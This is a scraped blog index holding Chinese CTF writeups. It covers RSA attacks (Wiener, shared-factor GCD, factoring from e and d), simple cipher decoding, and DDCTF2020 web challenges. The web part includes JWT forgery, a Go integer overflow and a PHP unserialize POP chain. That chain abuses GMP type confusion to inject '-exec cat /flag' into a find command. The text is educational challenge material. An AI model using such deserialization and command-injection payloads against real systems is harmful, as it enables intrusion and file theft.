6 cases out of 16. # Take advantage of Boolean short-circuit evaluation if ( h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8 ): # take square root if you must t = isqrt(n) if t*t == n: return t else: return -1 return -1def hack_RSA(e,n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return dn = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085d = hack_RSA(e,n)# print(d)flag = &quot;flag&#123;&quot; + hashlib.md5(hex(d).encode()).hexdigest() + &quot;&#125;&quot;print(flag) [GXYCTF2019]CheckInbase64+rot47 RSA5最大公因子分解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import gmpy2import libnume=65537n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320n2= 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855n3= 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c3= 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862n4= 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c4= 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613n5= 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c5= 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357n6= 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c6= 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932n7= 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c7= 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179n8= 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c8= 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006n9= 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c9= 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934n10= 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c10= 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869n11= 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c11= 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467n12= 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c12= 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971n13= 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c13= 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175n14= 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c14= 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457n15= 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c15= 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842n16= 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c16= 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724n17= 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c17= 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024n18= 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c18= 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887n19= 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c19= 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889n20= 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c20= 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346n=[]c=[]p=[]k1=0k2=0for i in range(1,20): n.append(eval(&#x27;n&#x27;+str(i))) c.append(eval(&#x27;c&#x27;+str(i)))data=list(zip(n,c))for i in range(len(n)): for j in range(i+1,len(n)): if gmpy2.gcd(n[i],n[j])!=1: k1=i k2=j print(i,j)#i=4,j=17p=gmpy2.gcd(n[k1],n[k2])q=n[k1]//pphi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c[k1],d,n[k1])print(libnum.n2s(m)) [GUET-CTF2019]BabyRSA12345p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740e : 0xe6b1bee47bd63f615c7d0a43c529d219d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a 由p+q和(p+1)(q+1)求出pq即n 再由n,e,d求p,q exp: 12345678910111213141516171819202122232425262728293031323334353637import gmpy2import randomimport libnumdef gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k //= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n//p return p,q a = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2eax = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740n = x - a -1e = 0xe6b1bee47bd63f615c7d0a43c529d219d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5enc_flag = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9ap,q=getpq(n,e,d)m = pow(enc_flag, d, p*q)print(libnum.n2s(m)) rot12345破解下面的密文：83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112flag格式flag&#123;&#125; 立马想到了asccii转字符串 但是发现是乱码 把ascii减13之后就可以了 12345s = &#x27;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&#x27;flag=&#x27;&#x27;for i in s.split(&#x27; &#x27;): flag+=chr(int(i)-13)print(flag) 直接提交发现不对 MD5估计是flag加密后的值 爆破 123456789101112import stringimport hashlibs = string.ascii_letters + string.digits + string.punctuationfor i in s: for j in s: for m in s: for n in s: k=&#x27;flag&#123;www_shiyanbar_com_is_very_good_&#x27;+i+j+m+n+&#x27;&#125;&#x27; if hashlib.md5(k.encode()).hexdigest()==&quot;38e4c352809e150186920aac37190cbc&quot;: print(k) break 密码学的心声8进制转ascii 12345s = &#x27;111114157166145123145143165162151164171126145162171115165143150&#x27;flag = &#x27;&#x27;for i in range(0,len(s),3): flag+=chr(int(&#x27;0o&#x27;+s[i:i+3],8))print(flag) 这是什么是个apk 十六进制编辑器打开发现是jsfuck 解密得到flag:http://discogscounter.getfreehosting.co.uk/js-noalnum.php?ckattempt=1&amp;i=3 [BJDCTF2020]这是base??","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://www.moonback.xyz/tags/crypto/"}]},{"title":"DDCTF2020部分题目writeup","slug":"DDCTF2020-writeup","date":"2020-09-06T03:10:29.000Z","updated":"2020-09-09T01:33:49.888Z","comments":true,"path":"2020/09/06/DDCTF2020-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/09/06/DDCTF2020-writeup/","excerpt":"难哭了！😭","text":"难哭了！😭 webWeb签到题传下参，很明显是JWT 将userRole改成ADMIN，密钥设置成admin成功得到客户端，后来才知道这个密码好像和用户名一样 接着就不会了 卡片商店go语言整数溢出漏洞，直接向朋友借1844674407370955161个发现 很明显发生了溢出，然后把借的还了兑换礼物就能得到 1url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12 访问提示不是幸运玩家，找到伪造cookie：https://github.com/EddieIvan01/secure-cookie-faker Overwrite Me源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phperror_reporting(0);class MyClass&#123; var $kw0ng; var $flag; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125; public function get_flag() &#123; return system(&#x27;find /FlagNeverFall &#x27; . escapeshellcmd($this-&gt;flag)); &#125;&#125;class Prompter&#123; protected $hint; public function execute($value) &#123; include($value); &#125; public function __invoke() &#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\\.\\.|\\.\\//i&quot;, $this-&gt;hint)) &#123; die(&quot;Don&#x27;t Do That!&quot;); &#125; $this-&gt;execute($this-&gt;hint); &#125;&#125;class Display&#123; public $contents; public $page; public function __construct($file=&#x27;/hint/hint.php&#x27;) &#123; $this-&gt;contents = $file; echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;; &#125; public function __toString() &#123; return $this-&gt;contents(); &#125; public function __wakeup() &#123; $this-&gt;page-&gt;contents = &quot;POP me! I can give you some hints!&quot;; unset($this-&gt;page-&gt;cont); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = array(); &#125; public function __unset($key) &#123; $func = $this-&gt;content; return $func(); &#125;&#125;class Info&#123; function __construct() &#123; eval(&#x27;phpinfo();&#x27;); &#125;&#125;$show = new Display();$bullet = $_GET[&#x27;bullet&#x27;];if(!isset($bullet))&#123; highlight_file(__FILE__); die(&quot;Give Me Something!&quot;);&#125;else if($bullet == &#x27;phpinfo&#x27;)&#123; $infos = new Info();&#125;else&#123; $obstacle = new stdClass; $mc = new MyClass(); $mc-&gt;flag = &quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;; @unserialize($bullet); echo $mc-&gt;get_flag();&#125; 访问/hint/hint.php提示和GMP扩展相关，搜了搜发现是GMP扩展反序列化类型混淆漏洞：https://hackerone.com/reports/198734 测试去除$obstacle = new stdClass;可以替换参数 12345678910111213141516171819202122232425&lt;?phpclass MyClass&#123; var $kw0ng; var $flag; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125; public function get_flag() &#123; echo $this-&gt;flag.&quot;\\n&quot;; &#125;&#125;// $obstacle = new stdClass;$mc = new MyClass();$mc-&gt;flag = &quot;id&quot;;$inner = &#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:6:&quot;whoami&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;;$exp = &#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;.strlen($inner).&#x27;:&#123;&#x27;.$inner.&#x27;&#125;&#125;&#x27;;// echo urlencode($exp);@unserialize($exp);$mc-&gt;get_flag();// var_dump($obstacle); 构造POP链： 12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(0);class Prompter&#123; protected $hint; public function __construct() &#123; $this-&gt;hint = &#x27;EOf9uk3nSsVFK1LQ.php&#x27;; &#125;&#125;class Display&#123; public $contents; public $page; public function __construct() &#123; $this-&gt;page = new Repeater(); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = new Prompter(); &#125;&#125;$a = new Display();$b=serialize($a);echo urlencode($b); 可以文件包含，但从phpinfo有open_basedir限制，向页面POST上传文件无响应 后来才知道，原来是可以任意类的任意函数执行的，漏洞点就在于： 12345public function __unset($key)&#123; $func = $this-&gt;content; return $func();&#125; $func()那里，如果可控的话，可以任意类中的方法调用的，看一个例子： 1234567891011121314151617181920212223&lt;?phperror_reporting(0);class T&#123; public function test() &#123; echo 456; &#125; public function test1($a)&#123; echo $a; &#125;&#125;$a = array(new T,&#x27;test&#x27;);$a();$b = array(&#x27;t&#x27;,&#x27;Test&#x27;);$b();$c = array(&#x27;t&#x27;,&#x27;test1&#x27;);$c(&#x27;456&#x27;);// 上面三个例子均会输出456 由此，pop链可以为： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);class MyClass&#123; var $kw0ng; var $flag; public function __construct()&#123; $this-&gt;flag = &#x27;-exec cat /flag ;&#x27;; &#125; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125;&#125;class Display&#123; public $contents; public $page; public function __construct() &#123; $this-&gt;page = new Repeater(); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = array(new MyClass(),&#x27;get_flag&#x27;); &#125;&#125;$a = new Display();$b=serialize($a);echo urlencode($b);","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"}]},{"title":"强网杯2020部分题目writeup","slug":"强网杯2020-wp","date":"2020-08-26T13:25:55.000Z","updated":"2020-09-06T14:07:21.975Z","comments":true,"path":"2020/08/26/强网杯2020-wp/","link":"","permalink":"http://www.moonback.xyz/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/","excerpt":"不愧是河南举办的最好的比赛！","text":"不愧是河南举办的最好的比赛！ web辅助给了附件，下载下来，审下源码，发现是反序列化字符逃逸，和2020安恒四月赛很像，但是增加了name关键字过滤,可以用S绕过，__weakup改下属性数量绕过 